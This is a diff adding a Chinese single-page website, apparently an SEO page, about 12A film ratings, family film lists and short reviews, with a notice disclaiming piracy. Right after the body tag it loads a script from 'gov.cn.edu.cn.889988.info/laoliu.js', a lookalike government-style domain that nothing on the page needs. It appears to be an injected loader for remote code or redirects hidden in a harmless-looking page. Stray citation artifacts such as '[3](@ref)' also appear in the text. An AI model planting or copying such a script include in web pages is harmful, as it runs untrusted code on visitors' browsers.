@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>十二级影单网 - 12A适龄/家庭观影/青少年电影片单 | 12adianyingwang-h5.github.io</title>
+<meta name="description" content="十二级影单网（12adianyingwang-h5.github.io）做 12A 级、家庭观影、青少年可看、成人陪同观影的电影片单与分级科普；合规影单站，不提供盗版播放。" />
+<meta name="keywords" content="十二级影单网, 12adianyingwang-h5, 12A电影推荐, 家庭观影片单, 青少年电影, 电影分级科普" />
+<meta name="author" content="十二级影单网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#10324a" />
+<link rel="canonical" href="https://12adianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"十二级影单网",
+  "url":"https://12adianyingwang-h5.github.io/",
+  "description":"12A级、家庭观影、青少年电影片单与电影分级科普",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://12adianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#08161f; --ink:#e8f1f7; --muted:#8fb0c2;
+  --line:#163243; --card:#0e2330;
+  --pri:#2fa8ff; --pri2:#7fd0ff; --gold:#e7c98b; --green:#5bff9a;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.7;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px;}
+
+header.site{position:sticky;top:0;z-index:50;background:#06121a;color:#fff;border-bottom:1px solid var(--line);}
+.bar{display:flex;align-items:center;gap:12px;height:62px;}
+.logo{font-weight:900;font-size:20px;letter-spacing:.5px;}
+.logo small{display:block;font-size:10px;opacity:.7;font-weight:500;color:var(--pri2);}
+nav.main{margin-left:auto;display:flex;gap:20px;font-size:14px;}
+nav.main a{padding:8px 2px;opacity:.9;}
+nav.main a:hover{color:var(--pri2);}
+.menu-btn{display:none;margin-left:auto;background:var(--pri);border:0;color:#06121a;width:42px;height:42px;border-radius:10px;font-size:20px;cursor:pointer;}
+
+.hero{padding:48px 0 28px;background:
+  radial-gradient(900px 240px at 85% -40%,rgba(47,168,255,.22),transparent),
+  radial-gradient(700px 220px at 5% 0%,rgba(127,208,255,.16),transparent),
+  #08161f;border-bottom:1px solid var(--line);}
+.hero h1{font-size:32px;margin:0 0 10px;}
+.hero p{color:var(--muted);max-width:600px;margin:0 0 18px;}
+.search{display:flex;gap:10px;max-width:540px;}
+.search input{flex:1;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#04101a;color:#fff;font-size:15px;}
+.search button{padding:12px 18px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--pri),var(--pri2));color:#04101a;font-weight:800;cursor:pointer;}
+
+section.block{padding:34px 0;border-bottom:1px solid var(--line);}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:18px;}
+.sec-head h2{font-size:23px;margin:0;}
+.sec-head span{color:var(--muted);font-size:13px;}
+
+/* 栏目1：12A片单 */
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.mv{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;}
+.mv .cv{height:200px;background:linear-gradient(160deg,#10324a,#2fa8ff);position:relative;}
+.mv:nth-child(2) .cv{background:linear-gradient(160deg,#0e2a24,#5bff9a);}
+.mv:nth-child(3) .cv{background:linear-gradient(160deg,#2a2410,#e7c98b);}
+.mv:nth-child(4) .cv{background:linear-gradient(160deg,#241033,#b98aff);}
+.mv:nth-child(5) .cv{background:linear-gradient(160deg,#331016,#ff7a8a);}
+.mv:nth-child(6) .cv{background:linear-gradient(160deg,#102433,#5bd6ff);}
+.mv .k{position:absolute;left:12px;top:12px;background:#0009;color:#fff;font-size:12px;padding:4px 10px;border-radius:99px;}
+.mv .bd{padding:14px;}
+.mv h3{font-size:16px;margin:0 0 4px;}
+.mv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目2：分级 */
+.ratings{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.rt{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;}
+.rt b{display:inline-block;font-size:18px;color:var(--pri2);margin-bottom:6px;}
+.rt h3{margin:0 0 6px;font-size:15px;}
+.rt p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目3：家庭观影时间线 */
+.tl{display:grid;gap:12px;}
+.row{display:grid;grid-template-columns:120px 1fr;gap:16px;background:var(--card);border:1px solid var(--line);border-left:4px solid var(--pri);border-radius:12px;padding:14px 16px;}
+.row b{color:var(--pri);font-size:14px;}
+.row h3{margin:0 0 4px;font-size:16px;}
+.row p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目4：短影评 */
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;}
+.rv{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.rv h3{margin:0 0 6px;font-size:17px;}
+.rv .q{color:var(--pri2);font-style:italic;margin:0 0 8px;}
+.rv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目5：关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:18px;}
+.box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.box ul{margin:10px 0 0;padding-left:18px;color:var(--muted);}
+.box li{margin:6px 0;}
+.note{background:#0c2030;border:1px solid #1d4a66;color:var(--pri2);padding:12px 14px;border-radius:12px;font-size:13px;margin-top:12px;}
+
+footer.site{background:#06121a;color:#8fb0c2;padding:30px 0 40px;font-size:13px;}
+footer.site a{color:var(--pri2);}
+
+@media(max-width:900px){
+  .grid3{grid-template-columns:repeat(2,1fr);}
+  .ratings{grid-template-columns:repeat(2,1fr);}
+  .reviews{grid-template-columns:1fr;}
+  .about{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  nav.main{position:fixed;inset:62px 0 auto 0;flex-direction:column;gap:0;background:#06121a;display:none;}
+  nav.main.open{display:flex;}
+  nav.main a{padding:14px 18px;border-bottom:1px solid #ffffff14;}
+  .menu-btn{display:block;}
+  .hero h1{font-size:25px;}
+  .grid3{grid-template-columns:1fr;}
+  .ratings{grid-template-columns:1fr;}
+  .row{grid-template-columns:84px 1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap bar">
+    <div class="logo">十二级影单网<small>12adianyingwang-h5.github.io</small></div>
+    <button class="menu-btn" aria-label="菜单" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="main" id="nav">
+      <a href="#list">12A片单</a>
+      <a href="#ratings">分级科普</a>
+      <a href="#wave">家庭观影脉络</a>
+      <a href="#reviews">短影评</a>
+      <a href="#about">关于 / 合规</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <h1>十二级影单网：12A 不是站名暗号，是“12岁也能聊的电影”</h1>
+    <p>12A = 12 岁以上适合观看，12 岁以下需成人陪同（英/爱影院分级逻辑）。本站做适龄片单、家庭观影、青少年成长与分级科普。不提供盗版播放、不挂网盘、不卖“会员看全网”。</p>
+    <form class="search" onsubmit="return false;">
+      <input type="text" placeholder="搜索：12A电影 / 家庭观影 / 青少年成长 / 冒险动画" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="block" id="list">
+    <div class="sec-head"><h2>🎬 12A / 家庭友好片单</h2><span>大卡</span></div>
+    <div class="grid3">
+      <article class="mv"><div class="cv"><span class="k">成长/冒险</span></div><div class="bd"><h3>寻梦环游记</h3><p>2017 / 亡灵、家庭、记忆，适合亲子聊“失去”</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">自然/勇气</span></div><div class="bd"><h3>少年派的奇幻漂流</h3><p>2012 / 海难、信仰、动物与想象边界</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">音乐/青春</span></div><div class="bd"><h3>摇滚校园</h3><p>2003 / 老师、孩子、把课堂变成乐队</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">奇幻/陪伴</span></div><div class="bd"><h3>帕丁顿熊</h3><p>2014 / 伦敦、移民、礼貌与冒险喜剧</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">太空/父女</span></div><div class="bd"><h3>星际穿越（青少年伴看）</h3><p>2014 / 黑洞、时间、父女关系，需成人陪聊</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">动画/正义</span></div><div class="bd"><h3>蜘蛛侠：平行宇宙</h3><p>2018 / 多元宇宙、少年担责、视觉狂欢</p></div></article>
+    </div>
+  </section>
+
+  <section class="block" id="ratings">
+    <div class="sec-head"><h2>🎫 电影分级小百科</h2><span>四列</span></div>
+    <div class="ratings">
+      <div class="rt"><b>U / G</b><h3>全年龄</h3><p>基本无吓人、无脏话、无危险模仿，幼儿也可看。</p></div>
+      <div class="rt"><b>PG</b><h3>家长引导</h3><p>可能有轻微惊险或情绪张力，低龄儿童建议家长陪看。</p></div>
+      <div class="rt"><b>12A</b><h3>12岁+</h3><p>12 岁以下需成人陪同；可有适度暴力、惊悚、语言。[3](@ref)</p></div>
+      <div class="rt"><b>12 / 15 / 18</b><h3>年龄门槛</h3><p>视频发行/院线更硬：12 不宜儿童租买，15/18 明确限龄。</p></div>
+      <div class="rt"><b>家长须知</b><h3>分级 ≠ 教育建议</h3><p>敏感孩子看 PG 也会怕，最终看“我家孩子行不行”。</p></div>
+      <div class="rt"><b>地区差异</b><h3>中英不同体系</h3><p>大陆无强制电影分级，英/美/欧分级体系不完全互通。</p></div>
+      <div class="rt"><b>伴看价值</b><h3>一起看一起聊</h3><p>12A 片价值常在映后：死亡、公平、勇气、谎言怎么谈。</p></div>
+      <div class="rt"><b>避雷提示</b><h3>别信“全年龄神片”</h3><p>标“全家看”的盗版站常塞恐怖/擦边片段，正版平台更稳。</p></div>
+    </div>
+  </section>
+
+  <section class="block" id="wave">
+    <div class="sec-head"><h2>🎞 家庭观影脉络</h2><span>时间线</span></div>
+    <div class="tl">
+      <div class="row"><b>1990s 皮克斯</b><div><h3>动画开始给大人留暗门</h3><p>《玩具总动员》表面儿童向，里面写孤独、被弃与成长。</p></div></div>
+      <div class="row"><b>2000s 奇幻</b><div><h3>孩子当主角，主题不幼稚</h3><p>《哈利·波特》《少年派》把死亡、信仰、选择塞进冒险里。</p></div></div>
+      <div class="row"><b>2010s 皮克斯后期</b><div><h3>情绪本身被拍成角色</h3><p>《头脑特工队》让 12 岁孩子聊抑郁、搬家、记忆消失。</p></div></div>
+      <div class="row"><b>2020s 多元宇宙</b><div><h3>12A 也能很烧脑</h3><p>《蜘蛛侠：平行宇宙》《瞬息全宇宙（伴看版）》把家庭与存在主义混着讲。</p></div></div>
+    </div>
+  </section>
+
+  <section class="block" id="reviews">
+    <div class="sec-head"><h2>📝 短影评摘要</h2><span>双栏</span></div>
+    <div class="reviews">
+      <div class="rv">
+        <h3>《寻梦环游记》</h3>
+        <p class="q">“被记住，才是另一种活着。”</p>
+        <p>亡灵节外衣下是祖辈道歉史；12 岁看热闹，家长看会哭，映后聊“家人能不能选”刚刚好。</p>
+      </div>
+      <div class="rv">
+        <h3>《少年派的奇幻漂流》</h3>
+        <p class="q">“老虎不下船，是因为真相太沉。”</p>
+        <p>海难、宗教、动物隐喻三层叠着；12A 伴看价值在结尾：你愿意信哪个故事？</p>
+      </div>
+      <div class="rv">
+        <h3>《头脑特工队》</h3>
+        <p class="q">“ sadness 不是 bug，是人在乎的证据。”</p>
+        <p>把情绪做成角色，比说教强十倍；适合跟刚搬家的孩子一起看。</p>
+      </div>
+      <div class="rv">
+        <h3>《帕丁顿熊》</h3>
+        <p class="q">“礼貌不是软弱，是把陌生人变成邻居。”</p>
+        <p>移民、伦敦、官僚笑话全藏在甜喜剧里；低龄不无聊，大龄不尴尬。</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="about">
+    <div class="sec-head"><h2>📌 关于十二级影单网</h2><span>站点说明</span></div>
+    <div class="about">
+      <div class="box">
+        <h3>本站定位</h3>
+        <p style="color:var(--muted)">原词「12a电影网」像盗版资源站短域名；本站借 12A 分级做“适龄观影指南”：12A 级、家庭友好、青少年成长、映后讨论。</p>
+        <ul>
+          <li>片单：寻梦环游记、少年派、帕丁顿熊、蜘蛛侠平行宇宙、星际穿越（伴看）</li>
+          <li>分级科普：U / PG / 12A / 12 / 15 / 18 与“家长陪同”含义</li>
+          <li>家庭脉络：皮克斯情绪片 → 奇幻成长 → 多元宇宙伴看</li>
+          <li>短影评：只讲适龄点、映后话题，不剧透关键反转</li>
+        </ul>
+        <div class="note">
+          合规边界：不提供盗版在线播放、不挂网盘/磁力/提取码、不卖“全网影视会员”。
+          看正版请走合法视频平台、院线与版权方授权渠道。[2,6](@ref)
+        </div>
+      </div>
+      <div class="box">
+        <h3>站点信息</h3>
+        <p style="color:var(--muted)">网址：<br><b>https://12adianyingwang-h5.github.io/</b></p>
+        <p style="color:var(--muted)">单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    十二级影单网 · 12adianyingwang-h5.github.io ｜ 12A适龄 / 家庭观影 / 青少年电影片单（合规影单站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
